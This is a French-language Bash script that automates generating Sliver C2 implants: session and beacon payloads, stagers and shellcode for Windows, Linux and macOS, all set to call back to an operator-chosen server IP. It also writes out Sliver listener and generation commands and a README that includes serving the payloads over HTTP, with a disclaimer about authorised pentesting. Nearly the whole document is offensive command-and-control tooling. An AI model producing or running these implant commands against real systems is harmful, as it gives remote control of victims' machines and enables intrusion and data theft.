#!/bin/bash

# =============================================================================
# GÉNÉRATEUR AUTOMATIQUE DE PAYLOADS SILVER C2
# =============================================================================
# Description: Script pour générer automatiquement différents types de payloads
# Usage: bash generate_payloads.sh [IP_SERVEUR]
# Exemple: bash generate_payloads.sh 192.168.1.100
# =============================================================================

# Couleurs pour l'affichage
GREEN='\033[0;32m'
BLUE='\033[0;34m'
YELLOW='\033[1;33m'
RED='\033[0;31m'
NC='\033[0m'

# Configuration par défaut
DEFAULT_LHOST="192.168.1.100"
LHOST=${1:-$DEFAULT_LHOST}
OUTPUT_DIR="./silver_payloads_$(date +%Y%m%d_%H%M%S)"

# Création du répertoire de sortie
mkdir -p "$OUTPUT_DIR"

echo -e "${BLUE}=============================================="
echo "    GÉNÉRATEUR DE PAYLOADS SILVER C2"
echo "=============================================="
echo -e "Server IP: ${GREEN}$LHOST${NC}"
echo -e "Output Dir: ${GREEN}$OUTPUT_DIR${NC}"
echo -e "=============================================="
echo -e "${NC}"

# Vérification que Sliver est disponible
if ! command -v sliver-client &> /dev/null; then
    echo -e "${RED}[ERROR] Sliver client non trouvé. Installez Silver C2 d'abord.${NC}"
    exit 1
fi

# Fonction de génération de payload
generate_payload() {
    local type=$1
    local transport=$2
    local os=$3
    local arch=$4
    local format=$5
    local filename=$6
    local extra_opts=$7
    
    echo -e "${YELLOW}[+] Génération: $filename${NC}"
    
    # Construction de la commande
    if [ "$type" == "beacon" ]; then
        cmd="generate beacon --$transport $LHOST:443 --os $os --arch $arch --format $format $extra_opts --save \"$OUTPUT_DIR/$filename\""
    elif [ "$type" == "stager" ]; then
        cmd="generate stager --lhost $LHOST --lport 443 --protocol tcp --format $format --arch $arch --save \"$OUTPUT_DIR/$filename\""
    else
        cmd="generate --$transport $LHOST:443 --os $os --arch $arch --format $format $extra_opts --save \"$OUTPUT_DIR/$filename\""
    fi
    
    echo "$cmd" >> "$OUTPUT_DIR/generation_commands.log"
    echo -e "${BLUE}  → $filename${NC}"
}

# 1. PAYLOADS WINDOWS STANDARDS
echo -e "${GREEN}=== GÉNÉRATION PAYLOADS WINDOWS ===${NC}"
generate_payload "session" "mtls" "windows" "amd64" "exe" "windows_x64_session.exe" ""
generate_payload "session" "mtls" "windows" "386" "exe" "windows_x86_session.exe" ""
generate_payload "session" "mtls" "windows" "amd64" "shared" "windows_x64.dll" ""
generate_payload "session" "mtls" "windows" "amd64" "service" "windows_service.exe" ""

# 2. BEACONS WINDOWS
echo -e "${GREEN}=== GÉNÉRATION BEACONS WINDOWS ===${NC}"
generate_payload "beacon" "mtls" "windows" "amd64" "exe" "beacon_win64_60s.exe" "--jitter 30s --interval 60s"
generate_payload "beacon" "mtls" "windows" "amd64" "exe" "beacon_win64_300s.exe" "--jitter 60s --interval 300s"
generate_payload "beacon" "mtls" "windows" "386" "exe" "beacon_win32_60s.exe" "--jitter 30s --interval 60s"

# 3. PAYLOADS LINUX
echo -e "${GREEN}=== GÉNÉRATION PAYLOADS LINUX ===${NC}"
generate_payload "session" "mtls" "linux" "amd64" "elf" "linux_x64_session" ""
generate_payload "session" "mtls" "linux" "386" "elf" "linux_x86_session" ""
generate_payload "beacon" "mtls" "linux" "amd64" "elf" "beacon_linux64" "--jitter 30s --interval 120s"

# 4. PAYLOADS MACOS
echo -e "${GREEN}=== GÉNÉRATION PAYLOADS MACOS ===${NC}"
generate_payload "session" "mtls" "darwin" "amd64" "macho" "macos_x64_session" ""
generate_payload "beacon" "mtls" "darwin" "amd64" "macho" "beacon_macos64" "--jitter 45s --interval 180s"

# 5. STAGERS
echo -e "${GREEN}=== GÉNÉRATION STAGERS ===${NC}"
generate_payload "stager" "tcp" "" "amd64" "exe" "stager_win64.exe" ""
generate_payload "stager" "tcp" "" "386" "exe" "stager_win32.exe" ""

# 6. TRANSPORTS ALTERNATIFS (HTTP/HTTPS)
echo -e "${GREEN}=== PAYLOADS TRANSPORTS ALTERNATIFS ===${NC}"
generate_payload "session" "http" "windows" "amd64" "exe" "windows_http.exe" ""
generate_payload "session" "https" "windows" "amd64" "exe" "windows_https.exe" ""
generate_payload "beacon" "http" "windows" "amd64" "exe" "beacon_http.exe" "--jitter 60s"

# 7. SHELLCODES
echo -e "${GREEN}=== GÉNÉRATION SHELLCODES ===${NC}"
generate_payload "session" "mtls" "windows" "amd64" "shellcode" "shellcode_win64.bin" ""
generate_payload "session" "mtls" "windows" "386" "shellcode" "shellcode_win32.bin" ""

# Création d'un script de commandes pour Sliver client
cat > "$OUTPUT_DIR/sliver_commands.txt" << EOF
# =============================================================================
# COMMANDES SLIVER POUR GÉNÉRER CES PAYLOADS
# =============================================================================
# Copiez et collez ces commandes dans le client Sliver

# Démarrage des listeners nécessaires
mtls --lport 443
http --lport 80  
https --lport 443

# Windows Sessions
generate --mtls $LHOST:443 --os windows --arch amd64 --format exe --save $OUTPUT_DIR/windows_x64_session.exe
generate --mtls $LHOST:443 --os windows --arch 386 --format exe --save $OUTPUT_DIR/windows_x86_session.exe
generate --mtls $LHOST:443 --os windows --arch amd64 --format shared --save $OUTPUT_DIR/windows_x64.dll
generate --mtls $LHOST:443 --os windows --arch amd64 --format service --save $OUTPUT_DIR/windows_service.exe

# Windows Beacons
generate beacon --mtls $LHOST:443 --os windows --arch amd64 --format exe --jitter 30s --interval 60s --save $OUTPUT_DIR/beacon_win64_60s.exe
generate beacon --mtls $LHOST:443 --os windows --arch amd64 --format exe --jitter 60s --interval 300s --save $OUTPUT_DIR/beacon_win64_300s.exe
generate beacon --mtls $LHOST:443 --os windows --arch 386 --format exe --jitter 30s --interval 60s --save $OUTPUT_DIR/beacon_win32_60s.exe

# Linux Payloads
generate --mtls $LHOST:443 --os linux --arch amd64 --format elf --save $OUTPUT_DIR/linux_x64_session
generate --mtls $LHOST:443 --os linux --arch 386 --format elf --save $OUTPUT_DIR/linux_x86_session
generate beacon --mtls $LHOST:443 --os linux --arch amd64 --format elf --jitter 30s --interval 120s --save $OUTPUT_DIR/beacon_linux64

# macOS Payloads
generate --mtls $LHOST:443 --os darwin --arch amd64 --format macho --save $OUTPUT_DIR/macos_x64_session
generate beacon --mtls $LHOST:443 --os darwin --arch amd64 --format macho --jitter 45s --interval 180s --save $OUTPUT_DIR/beacon_macos64

# Stagers
generate stager --lhost $LHOST --lport 443 --protocol tcp --format exe --arch amd64 --save $OUTPUT_DIR/stager_win64.exe
generate stager --lhost $LHOST --lport 443 --protocol tcp --format exe --arch 386 --save $OUTPUT_DIR/stager_win32.exe

# Transport Alternatifs
generate --http $LHOST:80 --os windows --arch amd64 --format exe --save $OUTPUT_DIR/windows_http.exe
generate --https $LHOST:443 --os windows --arch amd64 --format exe --save $OUTPUT_DIR/windows_https.exe
generate beacon --http $LHOST:80 --os windows --arch amd64 --format exe --jitter 60s --save $OUTPUT_DIR/beacon_http.exe

# Shellcodes
generate --mtls $LHOST:443 --os windows --arch amd64 --format shellcode --save $OUTPUT_DIR/shellcode_win64.bin
generate --mtls $LHOST:443 --os windows --arch 386 --format shellcode --save $OUTPUT_DIR/shellcode_win32.bin

EOF

# Création d'un script de setup des listeners
cat > "$OUTPUT_DIR/setup_listeners.txt" << EOF
# =============================================================================
# CONFIGURATION DES LISTENERS SILVER C2
# =============================================================================
# Commandes à exécuter dans le client Sliver avant génération

# Listener mTLS principal
mtls --lport 443

# Listeners HTTP/HTTPS
http --lport 80
https --lport 443

# Listener DNS (optionnel)
# dns --domains example.com --lport 53

# Vérification des listeners actifs
jobs

EOF

# Création d'un README
cat > "$OUTPUT_DIR/README.md" << EOF
# Payloads Silver C2 - $(date)

## Informations de génération
- **IP Serveur**: $LHOST
- **Date**: $(date)
- **Répertoire**: $OUTPUT_DIR

## Fichiers générés

### Windows
- \`windows_x64_session.exe\` - Payload Windows 64-bit session
- \`windows_x86_session.exe\` - Payload Windows 32-bit session  
- \`windows_x64.dll\` - DLL Windows 64-bit
- \`windows_service.exe\` - Service Windows
- \`beacon_win64_60s.exe\` - Beacon Windows 64-bit (60s)
- \`beacon_win64_300s.exe\` - Beacon Windows 64-bit (300s)
- \`beacon_win32_60s.exe\` - Beacon Windows 32-bit (60s)

### Linux
- \`linux_x64_session\` - Payload Linux 64-bit session
- \`linux_x86_session\` - Payload Linux 32-bit session
- \`beacon_linux64\` - Beacon Linux 64-bit

### macOS
- \`macos_x64_session\` - Payload macOS 64-bit session
- \`beacon_macos64\` - Beacon macOS 64-bit

### Stagers
- \`stager_win64.exe\` - Stager Windows 64-bit
- \`stager_win32.exe\` - Stager Windows 32-bit

### Transport Alternatifs
- \`windows_http.exe\` - Payload HTTP
- \`windows_https.exe\` - Payload HTTPS
- \`beacon_http.exe\` - Beacon HTTP

### Shellcodes
- \`shellcode_win64.bin\` - Shellcode Windows 64-bit
- \`shellcode_win32.bin\` - Shellcode Windows 32-bit

## Utilisation

1. **Démarrer le serveur Sliver**: \`sudo sliver-server\`
2. **Connecter le client**: \`sliver-client\`
3. **Configurer les listeners**: Voir \`setup_listeners.txt\`
4. **Générer les payloads**: Utiliser les commandes dans \`sliver_commands.txt\`

## ⚠️ Avertissement de Sécurité

Ces payloads sont destinés uniquement à:
- Tests de pénétration autorisés
- Recherche en cybersécurité
- Environnements de laboratoire

**NE PAS UTILISER** sur des systèmes sans autorisation explicite.

## Commandes utiles post-génération

\`\`\`bash
# Lister les payloads générés
implants

# Vérifier les listeners
jobs

# Vérifier les sessions actives
sessions

# Servir les payloads via HTTP
python3 -m http.server 8080
\`\`\`

EOF

# Résumé final
echo -e "${GREEN}"
echo "=============================================="
echo "    GÉNÉRATION TERMINÉE AVEC SUCCÈS!"
echo "=============================================="
echo -e "${NC}"
echo -e "Répertoire de sortie: ${BLUE}$OUTPUT_DIR${NC}"
echo -e "Fichiers de configuration créés:"
echo -e "  • ${YELLOW}sliver_commands.txt${NC} - Commandes Sliver"
echo -e "  • ${YELLOW}setup_listeners.txt${NC} - Configuration listeners"
echo -e "  • ${YELLOW}generation_commands.log${NC} - Log des commandes"
echo -e "  • ${YELLOW}README.md${NC} - Documentation"
echo ""
echo -e "${BLUE}Étapes suivantes:${NC}"
echo "1. Démarrer Sliver: sudo sliver-server"
echo "2. Client Sliver: sliver-client"  
echo "3. Configurer listeners: voir setup_listeners.txt"
echo "4. Générer payloads: copier/coller depuis sliver_commands.txt"
echo ""
echo -e "${RED}⚠️  Utilisez uniquement dans un environnement autorisé!${NC}"